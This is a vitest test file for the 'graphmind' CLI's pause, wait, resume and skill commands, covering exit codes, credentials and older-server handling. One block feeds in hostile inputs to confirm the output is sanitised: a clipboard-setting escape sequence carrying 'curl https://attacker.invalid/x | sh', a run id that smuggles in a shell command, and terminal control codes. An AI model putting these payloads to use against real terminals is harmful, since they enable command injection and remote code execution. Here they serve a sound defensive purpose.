/**
 * `graphmind pauses | wait | resume | skill` and `serve --json`, end to end:
 * a real server (with its credential files), a real @graphmind-ai/client
 * session holding a real gate, and — for the binary itself — the CLI built
 * into a private directory and run as a child process.
 */
import { execFileSync, spawn, type ChildProcess } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { createServer as createHttpServer, type RequestListener, type Server as HttpServer } from 'node:http';
import { createServer, type AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createSession, mergeToolInput, type GateDecision } from '@graphmind-ai/client';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { defaultFlags, parseCliArgs, type ParsedCli } from '../src/args.js';
import { EXIT, INLINE_LIMIT, portFlag, runPauses, runResume, runWait, type ControlIo } from '../src/commands/control.js';
import { SKILL_INSTALL_PATH, SKILL_SOURCE, runSkill } from '../src/commands/skill.js';
import { DEFAULT_PORT, packageRoot } from '../src/paths.js';
import type { ServerOptions } from '../src/server.js';
import { serveViewer } from '../src/static-site.js';
import { ALL_CAPABILITIES, heldApp, sleep } from './control-helpers.js';
import { FakeApp, startTestServer, waitUntil, type TestServer } from './helpers.js';

const cleanups: (() => Promise<void> | void)[] = [];
afterEach(async () => {
  while (cleanups.length > 0) await cleanups.pop()?.();
});

function tempDir(prefix: string): string {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

interface Booted {
  ts: TestServer;
  home: string;
}

async function boot(options: ServerOptions = {}): Promise<Booted> {
  const home = tempDir('graphmind-cli-home-');
  const ts = await startTestServer({ runFile: true, ...options, env: { GRAPHMIND_HOME: home, ...options.env } });
  cleanups.push(() => ts.cleanup());
  return { ts, home };
}

interface Captured {
  io: ControlIo;
  out: string[];
  err: string[];
}

function capture(home: string): Captured {
  const out: string[] = [];
  const err: string[] = [];
  return {
    io: { log: (m) => out.push(m), error: (m) => err.push(m), env: { GRAPHMIND_HOME: home } },
    out,
    err,
  };
}

function cli(args: string[]): ParsedCli {
  const parsed = parseCliArgs(args);
  expect(parsed.errors).toEqual([]);
  return parsed;
}

/** A real session holding a real, editable tool gate. */
async function realAgent(ts: TestServer, live: Record<string, unknown> = { query: 'lisbon', limit: 5 }) {
  ts.server.hub.state.set({ kind: 'tool', point: 'before' });
  const session = createSession({
    url: `ws://127.0.0.1:${ts.port}/ingest`,
    appName: 'cli-agent',
    enabled: true,
    env: {},
    retryIntervalMs: 60_000,
  });
  cleanups.push(() => session.dispose());
  expect(await session.ready({ timeoutMs: 5_000 })).toBe(true);
  let runId = '';
  let resolveDecision!: (d: GateDecision) => void;
  const decision = new Promise<GateDecision>((resolve) => {
    resolveDecision = resolve;
  });
  void session.run('cli-run', async (ctx) => {
    runId = ctx.runId;
    session.emit('node.started', { nodeId: 'tool:search', kind: 'tool', name: 'search', instanceId: 's-1', input: live });
    resolveDecision(
      await session.gate(
        'before',
        { nodeId: 'tool:search', kind: 'tool', name: 'search' },
        {
          editable: true,
          validateInput: (proposed) => {
            const merged = mergeToolInput(live, proposed);
            if (!merged.ok) return merged;
            const value = merged.value as Record<string, unknown>;
            return typeof value['query'] === 'string'
              ? merged
              : { ok: false, code: 'schema', message: 'query must be a string' };
          },
        },
      ),
    );
  });
  await waitUntil(() => runId !== '' && ts.server.hub.listPauses(runId).length === 1, 'agent held');
  const pauseId = ts.server.hub.listPauses(runId)[0]?.pauseId as string;
  return { runId, pauseId, decision };
}

describe('graphmind pauses', () => {
  it('lists held pauses (human and --json), and says how to wait when there are none', async () => {
    const { ts, home } = await boot();
    const empty = capture(home);
    expect(await runPauses(cli(['pauses', '--port', String(ts.port)]), empty.io)).toBe(EXIT.ok);
    expect(empty.out.join('\n')).toContain('No open pauses');
    const agent = await realAgent(ts);
    const human = capture(home);
    expect(await runPauses(cli(['pauses', '--port', String(ts.port)]), human.io)).toBe(EXIT.ok);
    const text = human.out.join('\n');
    expect(text).toContain(agent.runId.slice(0, 24));
    expect(text).toContain('tool:search');
    expect(text).toContain('(editable)');
    expect(text).toContain(`graphmind resume ${agent.pauseId} --run ${agent.runId} --port ${ts.port} --action continue`);
    const json = capture(home);
    expect(await runPauses(cli(['pauses', '--json', '--run', agent.runId, '--port', String(ts.port)]), json.io)).toBe(EXIT.ok);
    const parsed = JSON.parse(json.out[0] as string) as { pauses: { pauseId: string; editable: boolean }[] };
    expect(parsed.pauses).toEqual([expect.objectContaining({ pauseId: agent.pauseId, editable: true, state: 'open' })]);
  });

  it('exits 3 when no server answers', async () => {
    const port = await freePort();
    const c = capture(tempDir('gm-'));
    expect(await runPauses(cli(['pauses', '--port', String(port)]), c.io)).toBe(EXIT.unreachable);
    expect(c.err.join('\n')).toContain(`no GraphMind server on port ${port}`);
  });
});

describe('graphmind wait', () => {
  it('blocks until a pause appears and prints it with the held input and the next commands', async () => {
    const { ts, home } = await boot();
    const c = capture(home);
    const waiting = runWait(cli(['wait', '--port', String(ts.port), '--timeout', '10']), c.io);
    await sleep(300);
    const agent = await realAgent(ts);
    expect(await waiting).toBe(EXIT.ok);
    const text = c.out.join('\n');
    expect(text).toContain(`Paused: run ${agent.runId} · pause ${agent.pauseId}`);
    expect(text).toContain('tool:search (tool "search"), before the call');
    expect(text).toContain('editable  yes');
    expect(text).toContain('{"query":"lisbon","limit":5}');
    expect(text).toContain(`graphmind resume ${agent.pauseId} --run ${agent.runId} --port ${ts.port} --action continue --input @edited-input.json`);
  });

  it('--json: compact, with large values written to a private temp file whose path is printed', async () => {
    const { ts, home } = await boot();
    const big = { query: 'lisbon', notes: 'n'.repeat(INLINE_LIMIT * 3) };
    const agent = await realAgent(ts, big);
    const c = capture(home);
    expect(await runWait(cli(['wait', '--json', '--run', agent.runId, '--port', String(ts.port)]), c.io)).toBe(EXIT.ok);
    expect(c.out).toHaveLength(1);
    const out = JSON.parse(c.out[0] as string) as Record<string, unknown>;
    expect(out['pause']).toMatchObject({ runId: agent.runId, pauseId: agent.pauseId, editable: true, node: { kind: 'tool', name: 'search' } });
    expect(out['input']).toBeUndefined();
    const file = out['inputFile'] as string;
    cleanups.push(() => rmSync(join(file, '..'), { recursive: true, force: true }));
    expect(JSON.parse(readFileSync(file, 'utf8'))).toEqual(big);
    if (process.platform !== 'win32') expect(statSync(file).mode & 0o777).toBe(0o600);
    expect(out['inputBytes']).toBeGreaterThan(INLINE_LIMIT);
    expect((c.out[0] as string).length).toBeLessThan(2_000);
    expect(out['next']).toEqual(expect.arrayContaining([expect.stringContaining('--action continue')]));
  });

  it('exits 2 on timeout, and 4 when the awaited run ends without pausing', async () => {
    const { ts, home } = await boot();
    const c = capture(home);
    const started = Date.now();
    expect(await runWait(cli(['wait', '--port', String(ts.port), '--timeout', '1']), c.io)).toBe(EXIT.timeout);
    expect(Date.now() - started).toBeLessThan(5_000);
    expect(c.out.join('\n')).toContain('No pause within 1s');
    const held = await heldApp(ts.port, { runId: 'run-done' });
    held.app.send('exec.resumed', 'run-done', { pauseId: 'p1', action: 'continue' });
    held.app.send('run.finished', 'run-done', { status: 'ok' });
    await waitUntil(() => ts.server.hub.getRunInfo('run-done')?.status === 'ok', 'finished');
    const ended = capture(home);
    expect(await runWait(cli(['wait', '--json', '--run', 'run-done', '--port', String(ts.port), '--timeout', '5']), ended.io)).toBe(EXIT.gone);
    expect(JSON.parse(ended.out[0] as string)).toEqual({ pause: null, run: { id: 'run-done', status: 'ok' } });
    await held.app.close();
  });
});

describe('graphmind resume', () => {
  it('continues a real held call (agent token read from the run file)', async () => {
    const { ts, home } = await boot({ allowControl: 'resume' });
    const agent = await realAgent(ts);
    const c = capture(home);
    const code = await runResume(
      cli(['resume', agent.pauseId, '--run', agent.runId, '--action', 'continue', '--port', String(ts.port), '--operator', 'claude code']),
      c.io,
    );
    expect(code, c.err.join('\n')).toBe(EXIT.ok);
    expect(c.out.join('\n')).toContain(`resumed pause ${agent.pauseId}`);
    expect(await agent.decision).toMatchObject({ action: 'continue' });
    await waitUntil(() => ts.server.storage.listEvents(agent.runId).events.some((e) => e.type === 'exec.resumed'), 'stored');
    const resumed = ts.server.storage.listEvents(agent.runId).events.find((e) => e.type === 'exec.resumed');
    expect(resumed?.payload).toMatchObject({ principal: 'agent', operator: 'claude code' });
  });

  it('edits: a refused edit exits 6 and the call stays held; a good one runs the real call with the merged input', async () => {
    const { ts, home } = await boot({ allowControl: 'edit' });
    const agent = await realAgent(ts);
    const bad = capture(home);
    const port = String(ts.port);
    expect(await runResume(cli(['resume', agent.pauseId, '--run', agent.runId, '--action', 'continue', '--input', '{"query":7}', '--port', port]), bad.io)).toBe(EXIT.refused);
    expect(bad.err.join('\n')).toContain('[schema]');
    expect(ts.server.hub.listPauses(agent.runId)[0]?.state).toBe('open');
    const dir = tempDir('gm-input-');
    writeFileSync(join(dir, 'edited.json'), '{"query":"porto"}');
    const good = capture(home);
    const json = await runResume(
      cli(['resume', agent.pauseId, '--run', agent.runId, '--action', 'continue', '--input', `@${join(dir, 'edited.json')}`, '--json', '--port', port]),
      good.io,
    );
    expect(json).toBe(EXIT.ok);
    expect(JSON.parse(good.out[0] as string)).toMatchObject({ outcome: 'resumed', principal: 'agent' });
    expect(await agent.decision).toMatchObject({ action: 'continue', input: { query: 'porto', limit: 5 } });
  });

  it('exits 5 when the level is too low, when there is no token file, and when the token is stale', async () => {
    const { ts, home } = await boot(); // --allow-control off
    const agent = await realAgent(ts);
    const port = String(ts.port);
    const args = ['resume', agent.pauseId, '--run', agent.runId, '--action', 'continue', '--port', port];
    const off = capture(home);
    expect(await runResume(cli(args), off.io)).toBe(EXIT.unauthorized);
    expect(off.err.join('\n')).toContain('--allow-control=resume');
    const nofile = capture(tempDir('gm-empty-home-'));
    expect(await runResume(cli(args), nofile.io)).toBe(EXIT.unauthorized);
    expect(nofile.err.join('\n')).toContain('no credential file');
    writeFileSync(ts.server.runFilePath as string, JSON.stringify({ port: ts.port, pid: 1, url: 'x', agentToken: 'gma_stale', version: '0' }), { mode: 0o600 });
    const stale = capture(home);
    expect(await runResume(cli(args), stale.io)).toBe(EXIT.unauthorized);
    expect(stale.err.join('\n')).toContain('refused the agent token');
    expect(ts.server.hub.listPauses(agent.runId)[0]?.state).toBe('open');
  });

  it('exits 7 when another resume holds the pause, 4 when it is gone, 2 when the app does not answer in time', async () => {
    const { ts, home } = await boot({ allowControl: 'inject' });
    const held = await heldApp(ts.port, { answer: 'ignore' });
    await waitUntil(() => ts.server.hub.listPauses().length === 1, 'held');
    const port = String(ts.port);
    const slow = capture(home);
    const first = runResume(cli(['resume', 'p1', '--run', held.runId, '--action', 'inject', '--output', '{"ok":true}', '--timeout', '1', '--port', port]), slow.io);
    await waitUntil(() => held.resumes.length === 1, 'forwarded');
    const taken = capture(home);
    expect(await runResume(cli(['resume', 'p1', '--run', held.runId, '--action', 'abort', '--port', port]), taken.io)).toBe(EXIT.taken);
    expect(await first).toBe(EXIT.timeout);
    expect(held.resumes[0]).toMatchObject({ action: 'inject', output: { ok: true } });
    held.app.send('exec.resumed', held.runId, { pauseId: 'p1', action: 'inject' });
    await waitUntil(() => ts.server.hub.listPauses().length === 0, 'closed');
    const gone = capture(home);
    expect(await runResume(cli(['resume', 'p1', '--run', held.runId, '--action', 'continue', '--port', port]), gone.io)).toBe(EXIT.gone);
    await held.app.close();
  });

  it('a retry right after its own --timeout ran out is "no answer yet" (exit 2), not "taken" (exit 7): nobody else resumed', async () => {
    const { ts, home } = await boot({ allowControl: 'resume' });
    const held = await heldApp(ts.port, { runId: 'r', pauseId: 'p1', answer: 'ignore' });
    await waitUntil(() => ts.server.hub.listPauses().length === 1, 'held');
    const args = ['resume', 'p1', '--run', 'r', '--action', 'continue', '--timeout', '1', '--port', String(ts.port)];
    const first = capture(home);
    expect(await runResume(cli(args), first.io)).toBe(EXIT.timeout);
    expect(ts.server.hub.listPauses('r')[0]?.state).toBe('resolving');
    const retry = capture(home);
    expect(await runResume(cli(args), retry.io), retry.err.join('\n')).toBe(EXIT.timeout);
    expect(retry.err.join('\n')).toContain('[still-resolving]');
    expect(retry.err.join('\n')).not.toContain('another resume');
    expect(held.resumes).toHaveLength(1);
    await held.app.close();
  });

  it('an edit to a pause or app that cannot take one exits 6 (refused), not 5: raising --allow-control would not help', async () => {
    const { ts, home } = await boot({ allowControl: 'edit' });
    const legacy = await heldApp(ts.port, { runId: 'run-legacy', capabilities: ['pause', 'inject', 'retry', 'abort'], editable: true });
    const plain = await heldApp(ts.port, { runId: 'run-plain', editable: false });
    await waitUntil(() => ts.server.hub.listPauses().length === 2, 'two pauses');
    for (const runId of ['run-legacy', 'run-plain']) {
      const c = capture(home);
      const code = await runResume(
        cli(['resume', 'p1', '--run', runId, '--action', 'continue', '--input', '{"q":1}', '--port', String(ts.port)]),
        c.io,
      );
      expect(code, `${runId}: ${c.err.join('\n')}`).toBe(EXIT.refused);
      expect(c.err.join('\n')).toContain('[not-editable]');
    }
    expect(legacy.resumes).toEqual([]);
    expect(plain.resumes).toEqual([]);
    await legacy.app.close();
    await plain.app.close();
  });

  it('usage errors exit 1 without contacting the server', async () => {
    const home = tempDir('gm-');
    const cases: string[][] = [
      ['resume'],
      ['resume', 'p1', '--action', 'continue'],
      ['resume', 'p1', '--run', 'r'],
      ['resume', 'p1', '--run', 'r', '--action', 'jump'],
      ['resume', 'p1', '--run', 'r', '--action', 'inject'],
      ['resume', 'p1', '--run', 'r', '--action', 'continue', '--output', '1'],
      ['resume', 'p1', '--run', 'r', '--action', 'continue', '--input', 'not json'],
      ['resume', 'p1', '--run', 'r', '--action', 'continue', '--input', '@/definitely/missing.json'],
    ];
    for (const args of cases) {
      const c = capture(home);
      expect(await runResume(parseCliArgs(args), c.io), args.join(' ')).toBe(EXIT.usage);
    }
  });
});

describe('suggested commands and printed text are safe (app-controlled ids)', () => {
  // Any local process can write to /ingest without a credential, so run ids,
  // pause ids, node ids and names, the app name and a smart hold's detail are
  // untrusted text. Printed raw they drive the terminal; pasted raw into the
  // suggested `graphmind resume` they run a second command.
  const ESC = String.fromCharCode(0x1b);
  const BEL = String.fromCharCode(0x07);
  /** OSC 52: "set the clipboard to <base64>", which many terminals honour. */
  const OSC52 = `${ESC}]52;c;${Buffer.from('curl https://attacker.invalid/x | sh').toString('base64')}${BEL}`;
  /** C0 (except the line feed the CLI prints between lines), DEL, C1, bidi marks/overrides/isolates. */
  const UNPRINTABLE_RANGES: readonly [number, number][] = [
    [0x00, 0x09],
    [0x0b, 0x1f],
    [0x7f, 0x9f],
    [0x200e, 0x200f],
    [0x202a, 0x202e],
    [0x2066, 0x2069],
  ];
  function expectPrintable(text: string, where: string): void {
    const bad = [...text].filter((ch) => {
      const code = ch.codePointAt(0) as number;
      return UNPRINTABLE_RANGES.some(([from, to]) => code >= from && code <= to);
    });
    expect(bad.map((ch) => (ch.codePointAt(0) as number).toString(16)), `control characters in ${where}`).toEqual([]);
  }

  interface Hostile {
    ts: TestServer;
    home: string;
    runId: string;
    pauseId: string;
    marker: string;
    logs: string[];
  }

  async function hostilePause(): Promise<Hostile> {
    const markerDir = tempDir('gm-hostile-marker-');
    const marker = join(markerDir, 'gm-pwned');
    const logs: string[] = [];
    const { ts, home } = await boot({ log: (m: string) => logs.push(m) });
    const runId = `r1 --action abort; touch ${marker}; #`;
    const nodeId = `tool:x${OSC52}`;
    const app = await FakeApp.connect(ts.port, {
      app: `evil${ESC}]0;window title${BEL}${ESC}[2J`,
      capabilities: ALL_CAPABILITIES,
    });
    cleanups.push(() => app.close());
    app.send('run.started', runId, { app: 'evil-app', sdk: { name: 'test', version: '0.0.0' } });
    app.send('node.started', runId, { nodeId, kind: 'tool', name: `search${OSC52}`, instanceId: 'i1', input: { query: 'lisbon' } });
    app.send('exec.paused', runId, {
      pauseId: 'p1',
      nodeId,
      point: 'before',
      reason: 'breakpoint',
      smart: { rule: 'error-result', detail: `the tool failed${ESC}[2J${ESC}[H` },
    });
    await waitUntil(() => ts.server.hub.listPauses(runId).length === 1, 'hostile pause open');
    return { ts, home, runId, pauseId: 'p1', marker, logs };
  }

  /** Run a suggested command in a real POSIX shell with `graphmind` stubbed to print its argv. */
  function runSuggested(command: string): string[] {
    const script = `graphmind() { printf '%s\\n' "$@"; }\n${command}\n`;
    return execFileSync('/bin/sh', ['-c', script], { encoding: 'utf8' })
      .split('\n')
      .filter((line) => line !== '');
  }

  function expectSafe(command: string, h: Hostile): void {
    const argv = runSuggested(command);
    expect(existsSync(h.marker), `running the suggested command executed the payload:\n  ${command}`).toBe(false);
    expect(argv.slice(0, 4), `argv for: ${command}`).toEqual(['resume', h.pauseId, '--run', h.runId]);
  }

  it.skipIf(process.platform === 'win32')('`wait --json`: every next[] command passes the ids as single words and runs nothing else', async () => {
    const h = await hostilePause();
    const c = capture(h.home);
    expect(await runWait(cli(['wait', '--json', '--port', String(h.ts.port), '--timeout', '5']), c.io)).toBe(EXIT.ok);
    const out = JSON.parse(c.out[0] as string) as { pause: { runId: string }; next: string[] };
    expect(out.pause.runId).toBe(h.runId);
    expect(out.next.length).toBeGreaterThan(0);
    for (const command of out.next) expectSafe(command, h);
  });

  it.skipIf(process.platform === 'win32')('`wait` (human): safe Next: commands, and no escape sequence reaches the terminal', async () => {
    const h = await hostilePause();
    const c = capture(h.home);
    expect(await runWait(cli(['wait', '--port', String(h.ts.port), '--timeout', '5']), c.io)).toBe(EXIT.ok);
    const text = c.out.join('\n');
    expectPrintable(text, '`wait` output');
    // The node id is still recognisable: its controls are shown, not dropped.
    expect(text).toContain('tool:x\\u001b]52;c;');
    const lines = text.split('\n');
    const commands = lines.slice(lines.indexOf('Next:') + 1).map((line) => line.trim()).filter(Boolean);
    expect(commands.length).toBeGreaterThan(0);
    for (const command of commands) expectSafe(command, h);
  });

  it.skipIf(process.platform === 'win32')('`pauses` (human): safe hints, and no escape sequence reaches the terminal', async () => {
    const h = await hostilePause();
    const c = capture(h.home);
    expect(await runPauses(cli(['pauses', '--port', String(h.ts.port)]), c.io)).toBe(EXIT.ok);
    const text = c.out.join('\n');
    expectPrintable(text, '`pauses` output');
    const release = text.split('\n').find((line) => line.startsWith('Release it:'));
    expect(release).toBeDefined();
    expectSafe((release as string).slice('Release it:'.length).trim(), h);
  });

  it('an id with a control character gets no pasteable command at all', async () => {
    const { ts, home } = await boot();
    const runId = `run${ESC}[2Jx`;
    const held = await heldApp(ts.port, { runId });
    cleanups.push(() => held.app.close());
    await waitUntil(() => ts.server.hub.listPauses(runId).length === 1, 'held');
    const json = capture(home);
    expect(await runWait(cli(['wait', '--json', '--port', String(ts.port), '--timeout', '5']), json.io)).toBe(EXIT.ok);
    expect((JSON.parse(json.out[0] as string) as { next: string[] }).next).toEqual([]);
    const human = capture(home);
    expect(await runWait(cli(['wait', '--port', String(ts.port), '--timeout', '5']), human.io)).toBe(EXIT.ok);
    const text = human.out.join('\n');
    expectPrintable(text, '`wait` output');
    expect(text).not.toContain('graphmind resume');
    expect(text).toContain('control characters');
  });

  it('serve log: the app name is written without control characters', async () => {
    const h = await hostilePause();
    const attached = h.logs.filter((line) => line.startsWith('app attached'));
    expect(attached.length).toBeGreaterThan(0);
    for (const line of h.logs) expectPrintable(line, 'the serve log');
  });
});

describe('suggested commands name the port they were asked about', () => {
  it('wait --port N (json and human): every next command carries --port N, and running it verbatim resumes the pause', async () => {
    const { ts, home } = await boot({ allowControl: 'resume' });
    expect(ts.port).not.toBe(DEFAULT_PORT);
    const held = await heldApp(ts.port, { runId: 'run-port', pauseId: 'pause-port', editable: true });
    cleanups.push(() => held.app.close());
    const json = capture(home);
    expect(await runWait(cli(['wait', '--port', String(ts.port), '--json', '--timeout', '10']), json.io)).toBe(EXIT.ok);
    const next = (JSON.parse(json.out[0] as string) as { next: string[] }).next;
    expect(next.length).toBeGreaterThan(0);
    for (const command of next) expect(command, command).toMatch(new RegExp(`--port ${ts.port}(\\s|$)`));
    const human = capture(home);
    expect(await runWait(cli(['wait', '--port', String(ts.port), '--timeout', '10']), human.io)).toBe(EXIT.ok);
    const printed = human.out.join('\n').split('\n').filter((line) => line.trim().startsWith('graphmind resume '));
    expect(printed.length).toBeGreaterThan(0);
    for (const command of printed) expect(command).toContain(`--port ${ts.port}`);

    // Run the printed continue exactly as given: it reaches the server holding the pause.
    const continueCommand = next.find((command) => command.endsWith('--action continue')) as string;
    const r = capture(home);
    expect(await runResume(cli(continueCommand.split(/\s+/).slice(1)), r.io), r.err.join('\n')).toBe(EXIT.ok);
    expect(held.resumes).toHaveLength(1);
  });

  it('pauses --port N: the "wait", "Inspect one" and "Release it" hints carry --port N; the default port adds nothing', async () => {
    const { ts, home } = await boot();
    const empty = capture(home);
    expect(await runPauses(cli(['pauses', '--port', String(ts.port)]), empty.io)).toBe(EXIT.ok);
    expect(empty.out.find((line) => line.startsWith('Block until one appears:'))).toContain(`graphmind wait --port ${ts.port}`);
    const held = await heldApp(ts.port, { runId: 'run-port2', pauseId: 'pause-port2' });
    cleanups.push(() => held.app.close());
    await waitUntil(() => ts.server.hub.listPauses().length === 1, 'held');
    const c = capture(home);
    expect(await runPauses(cli(['pauses', '--port', String(ts.port)]), c.io)).toBe(EXIT.ok);
    const lines = c.out.join('\n').split('\n');
    expect(lines.find((line) => line.startsWith('Inspect one:'))).toContain(`graphmind wait --run run-port2 --port ${ts.port}`);
    expect(lines.find((line) => line.startsWith('Release it:'))).toContain(
      `graphmind resume pause-port2 --run run-port2 --port ${ts.port} --action continue`,
    );
    expect(portFlag(DEFAULT_PORT)).toBe('');
  });
});

describe('against a server without the 0.6 control plane', () => {
  // A 0.5.x `graphmind serve` has no /api/pauses: its router ends in
  // `app.get('/*', serveViewer)` (v0.5.1 server.ts), and serveViewer's SPA
  // fallback answers any extensionless GET — /api/pauses?wait=30 included —
  // at once with 200 text/html. static-site.ts is unchanged since v0.5.1.
  interface OtherServer {
    port: number;
    /** GET /api/pauses requests received so far. */
    pausesHits(): number;
    close(): Promise<void>;
  }

  async function listen(handler: RequestListener): Promise<OtherServer & { server: HttpServer }> {
    let hits = 0;
    const server = createHttpServer((req, res) => {
      if ((req.url ?? '').startsWith('/api/pauses')) hits += 1;
      handler(req, res);
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', () => resolve()));
    let closed = false;
    const close = async (): Promise<void> => {
      if (closed) return;
      closed = true;
      server.closeAllConnections();
      await new Promise<void>((resolve) => server.close(() => resolve()));
    };
    cleanups.push(close);
    return { server, port: (server.address() as AddressInfo).port, pausesHits: () => hits, close };
  }

  /** The v0.5.1 routes: /health, /api/runs, then the real serveViewer for every other GET. */
  async function server051(): Promise<OtherServer> {
    const viewerDist = tempDir('graphmind-051-viewer-');
    writeFileSync(join(viewerDist, 'index.html'), '<!doctype html><html><body><div id="root"></div></body></html>\n');
    return await listen((req, res) => {
      const url = new URL(req.url ?? '/', 'http://127.0.0.1');
      if (url.pathname === '/health') {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ok: true, name: 'graphmind-ai', version: '0.5.1' }));
        return;
      }
      if (url.pathname === '/api/runs') {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ runs: [] }));
        return;
      }
      if (req.method === 'GET') {
        const response = serveViewer(`http://127.0.0.1${req.url ?? '/'}`, viewerDist);
        void response.arrayBuffer().then((body) => {
          res.writeHead(response.status, Object.fromEntries(response.headers.entries()));
          res.end(Buffer.from(body));
        });
        return;
      }
      res.writeHead(404, { 'content-type': 'text/plain' });
      res.end('404 Not Found');
    });
  }

  it('precondition: the 0.5.1-shaped server answers GET /api/pauses?wait=30 at once with 200 text/html', async () => {
    const old = await server051();
    const started = Date.now();
    const response = await fetch(`http://127.0.0.1:${old.port}/api/pauses?wait=30`);
    expect(response.status).toBe(200);
    expect(response.headers.get('content-type')).toMatch(/text\/html/);
    expect(Date.now() - started).toBeLessThan(1_000);
  });

  it('control: a real 0.6 server long-polls — `wait --timeout 2` sends one or two requests', async () => {
    const { ts, home } = await boot();
    const realFetch = globalThis.fetch;
    let hits = 0;
    globalThis.fetch = ((input: Parameters<typeof fetch>[0], init?: RequestInit) => {
      if (String(input).includes('/api/pauses')) hits += 1;
      return realFetch(input, init);
    }) as typeof fetch;
    cleanups.push(() => {
      globalThis.fetch = realFetch;
    });
    expect(await runWait(cli(['wait', '--port', String(ts.port), '--timeout', '2']), capture(home).io)).toBe(EXIT.timeout);
    expect(hits).toBeLessThanOrEqual(2);
  });

  it('`pauses` (human and --json) says the server is too old and exits 3, never "No open pauses"', async () => {
    const old = await server051();
    const human = capture(tempDir('gm-'));
    expect(await runPauses(cli(['pauses', '--port', String(old.port)]), human.io)).toBe(EXIT.unreachable);
    expect(human.out.join('\n')).not.toMatch(/No open pauses/);
    expect(human.err.join('\n')).toContain('0.5.1');
    expect(human.err.join('\n')).toContain('0.6');
    const json = capture(tempDir('gm-'));
    expect(await runPauses(cli(['pauses', '--json', '--port', String(old.port)]), json.io)).toBe(EXIT.unreachable);
    expect(json.out).toEqual([]);
  });

  it('`wait` does not hammer it: exit 3 after a request or two, with --timeout 2 and with --timeout 0', async () => {
    const old = await server051();
    const c = capture(tempDir('gm-'));
    expect(await runWait(cli(['wait', '--port', String(old.port), '--timeout', '2']), c.io)).toBe(EXIT.unreachable);
    expect(c.out.join('\n')).not.toMatch(/No pause within/);
    expect(c.err.join('\n')).toContain('0.5.1');
    expect(old.pausesHits()).toBeLessThanOrEqual(2);
    const forever = capture(tempDir('gm-'));
    const started = Date.now();
    expect(await runWait(cli(['wait', '--port', String(old.port), '--timeout', '0']), forever.io)).toBe(EXIT.unreachable);
    expect(Date.now() - started).toBeLessThan(3_000);
  });

  it('an unrelated service answering 200 text/plain is not an empty GraphMind server', async () => {
    const other = await listen((_req, res) => {
      res.writeHead(200, { 'content-type': 'text/plain' });
      res.end('OK\n');
    });
    const p = capture(tempDir('gm-'));
    expect(await runPauses(cli(['pauses', '--port', String(other.port)]), p.io)).toBe(EXIT.unreachable);
    expect(p.err.join('\n')).toContain('not a GraphMind');
    const w = capture(tempDir('gm-'));
    expect(await runWait(cli(['wait', '--port', String(other.port), '--timeout', '1']), w.io)).toBe(EXIT.unreachable);
    expect(other.pausesHits()).toBeLessThanOrEqual(3);
  });

  it('`wait` waits between polls when a server answers early without timedOut', async () => {
    // Valid 0.6-shaped answers that do not long-poll (a proxy that buffers, a
    // misbehaving server): the loop must never spin.
    const eager = await listen((_req, res) => {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ pauses: [] }));
    });
    const c = capture(tempDir('gm-'));
    expect(await runWait(cli(['wait', '--port', String(eager.port), '--timeout', '2']), c.io)).toBe(EXIT.timeout);
    expect(eager.pausesHits()).toBeLessThanOrEqual(4);
  });

  it('`resume` with no server at all (clean exit removed the run file) exits 3, like pauses and wait', async () => {
    const home = tempDir('gm-resume-home-');
    const ts = await startTestServer({ runFile: true, env: { GRAPHMIND_HOME: home } });
    const port = ts.port;
    await ts.cleanup();
    expect(existsSync(ts.server.runFilePath as string)).toBe(false);
    const c = capture(home);
    expect(await runResume(cli(['resume', 'p1', '--run', 'r', '--action', 'continue', '--port', String(port)]), c.io)).toBe(
      EXIT.unreachable,
    );
    expect(c.err.join('\n')).toContain(`no GraphMind server on port ${port}`);
  });

  it('`resume` against a 0.5.x server (it writes no run file) says the server is too old and exits 3', async () => {
    const old = await server051();
    const c = capture(tempDir('gm-'));
    expect(await runResume(cli(['resume', 'p1', '--run', 'r', '--action', 'continue', '--port', String(old.port)]), c.io)).toBe(
      EXIT.unreachable,
    );
    expect(c.err.join('\n')).toContain('0.5.1');
  });
});

describe('graphmind skill', () => {
  it('prints the Agent Skill (YAML frontmatter with name and description)', async () => {
    const chunks: string[] = [];
    const code = await runSkill(cli(['skill']), { out: (t) => chunks.push(t), log: () => {}, error: () => {}, cwd: tempDir('gm-') });
    expect(code).toBe(0);
    const text = chunks.join('');
    const front = /^---\nname: graphmind\ndescription: (.+)\n---\n/.exec(text);
    expect(front).not.toBeNull();
    expect((front?.[1] ?? '').length).toBeLessThanOrEqual(1024);
    for (const needle of ['serve --json', '--allow-control', 'graphmind wait', 'graphmind resume', 'graphmind pauses', 'REAL call', 'prompt injection', '@graphmind-ai/sdk', '@graphmind-ai/langgraph', 'mcp-proxy', 'pip install graphmind-ai']) {
      expect(text, needle).toContain(needle);
    }
    expect(text).toBe(readFileSync(SKILL_SOURCE, 'utf8'));
  });

  it('--install writes .claude/skills/graphmind/SKILL.md, refuses to overwrite without --force', async () => {
    const cwd = tempDir('gm-project-');
    const logs: string[] = [];
    const errors: string[] = [];
    const io = { out: () => {}, log: (m: string) => logs.push(m), error: (m: string) => errors.push(m), cwd };
    expect(await runSkill(cli(['skill', '--install']), io)).toBe(0);
    const target = join(cwd, SKILL_INSTALL_PATH);
    expect(readFileSync(target, 'utf8')).toBe(readFileSync(SKILL_SOURCE, 'utf8'));
    writeFileSync(target, 'my own edits');
    expect(await runSkill(cli(['skill', '--install']), io)).toBe(1);
    expect(errors.join('\n')).toContain('--force');
    expect(readFileSync(target, 'utf8')).toBe('my own edits');
    expect(await runSkill(cli(['skill', '--install', '--force']), io)).toBe(0);
    expect(readFileSync(target, 'utf8')).toBe(readFileSync(SKILL_SOURCE, 'utf8'));
  });

  it('ships in the npm package', () => {
    const pkg = JSON.parse(readFileSync(join(packageRoot, 'package.json'), 'utf8')) as { files: string[] };
    expect(pkg.files).toContain('skills');
    expect(existsSync(join(packageRoot, 'skills', 'graphmind', 'SKILL.md'))).toBe(true);
  });
});

describe('argument parsing', () => {
  it('parses the control flags and rejects bad values', () => {
